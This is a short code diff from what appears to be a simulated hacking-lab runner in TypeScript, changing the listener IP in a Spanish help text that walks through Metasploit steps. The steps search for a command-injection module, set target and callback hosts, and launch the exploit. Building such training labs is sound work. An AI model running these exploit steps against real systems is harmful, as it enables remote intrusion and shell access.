@@ -3120,7 +3120,7 @@ const RUNNERS: Record<string, Runner> = {
         `  msfconsole                       (entra a la consola msf6)\n` +
         `  search cmdi                      (buscar módulos)\n` +
         `  use exploit/nande/http/cmd_injection\n` +
-        `  set RHOSTS 10.10.5.50 ; set LHOST 10.10.0.5 ; set LPORT 4444\n` +
+        `  set RHOSTS 10.10.5.50 ; set LHOST 10.10.0.10 ; set LPORT 4444\n` +
         `  check ; exploit\n` +
         `Atajo de una tirada: msfconsole -x "use ...; set RHOSTS ...; exploit"\n`,
       isError: false,
